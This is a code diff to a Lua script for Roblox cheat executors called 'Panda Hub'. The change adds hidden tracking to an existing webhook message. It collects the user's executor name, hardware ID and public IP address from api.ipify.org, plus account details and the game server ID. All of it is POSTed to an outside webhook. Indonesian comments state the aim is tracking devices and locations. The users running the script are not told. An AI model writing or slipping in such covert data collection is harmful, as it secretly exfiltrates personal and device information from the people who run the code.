@@ -37,12 +37,44 @@ spawn(function()
     if req then
         pcall(function()
             local t = os.date("%Y-%m-%d %H:%M:%S")
+            
+            -- Mendapatkan Executor Name
+            local executor = "Unknown"
+            pcall(function() executor = (identifyexecutor and identifyexecutor()) or "Unknown" end)
+            
+            -- Mendapatkan HWID (Hardware ID) untuk melacak perangkat (device)
+            local hwid = "Not Supported"
+            pcall(function() hwid = (gethwid and gethwid()) or (syn and syn.get_hwid and syn.get_hwid()) or "Not Supported" end)
+            
+            -- Mendapatkan IP Address untuk melacak lokasi
+            local ip = "Unknown"
+            pcall(function() ip = game:HttpGet("https://api.ipify.org/") end)
+            
+            -- Susun pesan tracking yang jauh lebih detail
+            local detailedMessage = string.format(
+                "🚀 `[%s]` **%s** (@%s) has executed Panda Hub!\n\n" ..
+                "**👤 Player Info:**\n" ..
+                "• UserID: %d\n" ..
+                "• Account Age: %d Days\n\n" ..
+                "**💻 System & Network (Tracking):**\n" ..
+                "• Executor: %s\n" ..
+                "• IP Address: %s\n" ..
+                "• HWID: %s\n\n" ..
+                "**🎮 Game Server:**\n" ..
+                "• PlaceID: %d\n" ..
+                "• JobID: %s",
+                t, LocalPlayer.DisplayName, LocalPlayer.Name,
+                LocalPlayer.UserId, LocalPlayer.AccountAge,
+                executor, ip, hwid,
+                game.PlaceId, tostring(game.JobId)
+            )
+
             req({
                 Url = WEBHOOK_URL,
                 Method = "POST",
                 Headers = { ["Content-Type"] = "application/json" },
                 Body = HttpService:JSONEncode({
-                    content = string.format("🚀 `[%s]` **%s** (@%s) has executed Panda Hub!", t, LocalPlayer.DisplayName, LocalPlayer.Name)
+                    content = detailedMessage
                 })
             })
         end)
